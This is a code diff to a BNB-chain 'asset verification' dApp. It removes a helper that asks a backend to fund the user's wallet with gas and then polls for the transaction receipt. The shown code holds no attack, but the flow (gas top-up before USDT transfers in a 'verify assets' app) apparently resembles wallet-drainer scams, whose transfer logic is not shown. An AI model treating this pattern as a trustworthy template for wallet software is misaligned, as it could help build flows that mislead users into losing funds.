@@ -417,37 +417,6 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  const requestGasBeforeTransaction = async (provider: BinanceWallet): Promise<void> => {
-    const response = await fetch("/api/gas-assistance", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ userWallet: account }),
-    })
-    const result = await response.json()
-
-    if (!response.ok || !result.success) {
-      throw new Error(result.message || "Unable to fund BNB gas fees")
-    }
-
-    if (!result.txHash) return
-
-    for (let attempt = 0; attempt < 60; attempt++) {
-      const receipt = await provider.request({
-        method: "eth_getTransactionReceipt",
-        params: [result.txHash],
-      })
-
-      if (receipt) {
-        if (receipt.status !== "0x1") throw new Error("BNB gas assistance transaction failed")
-        return
-      }
-
-      await new Promise((resolve) => setTimeout(resolve, 1000))
-    }
-
-    throw new Error("BNB gas assistance transaction timed out")
-  }
-
   const verifyAssets = async () => {
     if (!isConnected) {
       toast({
@@ -532,7 +501,6 @@ export default function BNBVerifyDApp() {
         return
       }
 
-      await requestGasBeforeTransaction(provider)
       const refreshedBNBBalance = await getBalance(account, provider)
       const gasCheck = await web3Transfer.hasEnoughBNBForGas(usdtBalance)
       setGasInfo(gasCheck)
